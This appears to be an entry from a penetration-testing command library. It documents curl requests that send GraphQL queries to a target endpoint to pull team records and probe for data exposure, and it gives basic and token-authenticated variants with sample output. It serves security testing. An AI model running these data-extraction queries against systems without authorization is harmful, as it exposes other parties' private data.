---
id: 960b2007-b84b-4d1f-a859-87329cf26214
name: curl-send-graphql-query
type: command
executor: bash
data: >-
  curl -X POST -H "Content-Type: application/json" -d '{"query": "query { teams
  { total_count, edges { node { id, _id, about, handle, state } } } }"}'
  $_TARGET_URL
output: null
created_at: '2023-04-06T03:55:58.816432+00:00'
updated_at: '2023-04-10T20:22:23.645696+00:00'
platforms:
  - Linux
  - macOS
  - Windows (with curl)
tags:
  - graphql
  - web-exploit
verified: true
validated: true
---

# curl-send-graphql-query

## Command

```bash
curl -X POST -H "Content-Type: application/json" -d '{"query": "query { teams { total_count, edges { node { id, _id, about, handle, state } } } }"}' $_TARGET_URL
```

## Description

This command sends a POST request to a GraphQL endpoint using curl, delivering a JSON payload with a query that extracts data via edges and nodes. It is used to test for data exposure vulnerabilities in GraphQL APIs by requesting connected objects like teams and their details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The GraphQL endpoint URL (e.g., http://target.com/graphql) | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -H "Content-Type: application/json" | Sets JSON header for payload | Yes |
| -d '...' | The JSON data payload containing the query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"query": "query { __typename }"}' http://example.com/graphql
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $_TOKEN" -d '{"query": "query { teams(first: 5) { edges { node { id } } } }"}' $_TARGET_URL -o response.json
```

Add authentication headers or save output with -o for parsing.

## Expected Output

A JSON response with the queried data if successful, e.g.:

```json
{
  "data": {
    "teams": {
      "total_count": 42,
      "edges": [
        {
          "node": {
            "id": "team-123",
            "_id": "abc123",
            "about": "Internal team description",
            "handle": "teamhandle",
            "state": "active"
          }
        }
      ]
    }
  }
}
```
Errors may return {"errors": [{"message": "Unauthorized"}]} if access is denied.

## Related

- [[procedures/GraphQL-Edge-Node-Data-Extraction]] (procedure that uses this command)
- [[tools/cURL]] (base tool)
